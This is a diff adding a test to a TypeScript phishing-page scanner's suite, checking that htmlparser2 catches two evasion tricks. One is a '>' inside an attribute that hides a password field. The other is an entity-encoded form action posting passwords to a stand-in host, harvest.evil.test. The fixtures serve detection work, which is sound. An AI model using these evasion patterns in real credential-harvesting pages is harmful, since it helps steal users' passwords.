@@ -48,6 +48,24 @@ test("detects formless credential capture (password inputs outside a <form>)", (
   expect(scan(pinGrid, "https://example.com/")).not.toContain("credential_form_on_suspicious_host");
 });
 
+test("htmlparser2 tokenization survives evasion that defeats <tag …> regexes", () => {
+  const scan = (html: string, url: string) => {
+    const scanner = createScanner({ source: { url, contentType: "text/html" } });
+    scanner.feed(new TextEncoder().encode(html));
+    return scanner.finish().findings.map((f) => f.ruleId);
+  };
+  // A `>` inside a quoted attribute value before type="password": the old
+  // `<\s*([a-z0-9:-]+)\b([^>]*)>` regex stops at that `>`, never sees the
+  // password type, and misses the credential capture. htmlparser2 tokenizes it
+  // correctly.
+  const evasive = `<html><body><div><input name="u" data-tip="click > here" type="password"></div></body></html>`;
+  expect(scan(evasive, "https://victim123.github.io/login/")).toContain("credential_form_on_suspicious_host");
+  // An entity-encoded off-origin form action — `>` and the scheme hidden behind
+  // entities — still resolves to the off-origin POST target after decoding.
+  const encodedAction = `<form action="https&#58;//harvest.evil.test/p" method="post"><input type="password" name="pw"></form>`;
+  expect(scan(encodedAction, "https://login.example.com/")).toContain("credential_form_posts_off_origin");
+});
+
 test("flags brand impersonation in content but not the brand's own login", () => {
   const scan = (html: string, url: string) => {
     const scanner = createScanner({ source: { url, contentType: "text/html" } });
